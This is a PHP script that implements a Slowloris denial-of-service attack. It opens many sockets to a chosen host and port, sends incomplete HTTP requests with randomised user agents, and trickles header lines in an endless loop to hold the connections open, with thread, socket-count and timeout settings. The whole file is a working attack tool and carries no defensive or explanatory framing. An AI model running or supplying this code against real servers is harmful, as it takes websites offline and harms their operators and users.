<?php

include __DIR__ . '/user-agents.php.inc';

const DEFAULT_SOCKET_COUNT = 150;
const DEFAULT_TIMEOUT      = 10;
const DEFAULT_THREAD_COUNT = 3;

function getRandomUserAgent(): string
{
    return USER_AGENTS[\array_rand(USER_AGENTS)];
}

function validateArguments(array $argv): array
{
    $hostname    = $argv[1] ?? null;
    $port        = $argv[2] ?? null;
    $threadCount = $argv[3] ?? DEFAULT_THREAD_COUNT;
    $socketCount = $argv[4] ?? DEFAULT_SOCKET_COUNT;
    $timeout     = $argv[5] ?? DEFAULT_TIMEOUT;

    if (!$hostname && !$port) {
        echo 'usage: php slowloris.php hostname port [threadCount] [socketCount] [timeout]' . PHP_EOL;
        die;
    }

    if (!is_numeric($port)) {
        echo 'Port must be numeric' . PHP_EOL;
        die;
    }

    if (!is_numeric($threadCount)) {
        echo 'Thread count must be numeric' . PHP_EOL;
        die;
    }

    if (!is_numeric($socketCount)) {
        echo 'Socket count must be numeric' . PHP_EOL;
        die;
    }

    if (!is_numeric($timeout)) {
        echo 'Timeout must be numeric' . PHP_EOL;
        die;
    }

    return [$hostname, $port, $threadCount, $socketCount, $timeout];
}

/**
 * @param string $hostname
 * @param int    $port
 *
 * @return false|resource
 */
function initializeSocket(string $hostname, int $port)
{
    $socket = \socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    if (@\socket_connect($socket, \gethostbyname($hostname), $port) === false) {
        echo 'Could not connect to host!' . PHP_EOL;

        return false;
    }

    $userAgent = getRandomUserAgent();
    $message   = "GET / HTTP/1.1\r\n";
    $message .= "Host: $hostname\r\n";
    $message .= "User-Agent: $userAgent\r\n";
    $message .= "Accept-Language: en-US,en,q=0.5\r\n";

    \socket_write($socket, $message, \strlen($message));

    return $socket;
}

function registerSignals(array &$listOfSockets = []): void
{
    $callback = static function () use (&$listOfSockets) {
        echo 'Gracefully shutting down...' . PHP_EOL;

        foreach ($listOfSockets as $key => $socket) {
            echo 'closing socket...' . PHP_EOL;

            \socket_close($socket);

            unset($listOfSockets[$key]);
        }

        die;
    };

    \pcntl_async_signals(true);
    \pcntl_signal(\SIGINT, $callback);
    \pcntl_signal(\SIGTERM, $callback);
    \pcntl_signal(\SIGUSR1, $callback);
}

function flood(string $hostname, int $port, int $socketCount, int $timeout, array $listOfSockets): void
{
    while (true) {
        $activeCount = ($socketCount - \count($listOfSockets));

        echo 'Building sockets...' . PHP_EOL;

        for ($i = 0; $i < $activeCount; $i++) {
            $socket = initializeSocket($hostname, $port);

            $listOfSockets[] = $socket;
        }

        $packetCount = 0;

        echo 'Sending data...' . PHP_EOL;

        foreach ($listOfSockets as $key => $socket) {
            $message = \sprintf("X-a: %s\r\n", \random_int(1, 5000));

            if (@\socket_write($socket, $message, \strlen($message)) === false) {
                unset($listOfSockets[$key]);
                \socket_close($socket);
            } else {
                $packetCount++;
            }
        }

        echo "$packetCount packets sent successfully. Thread now sleeping for $timeout seconds..." . PHP_EOL;

        \sleep($timeout);
    }
}
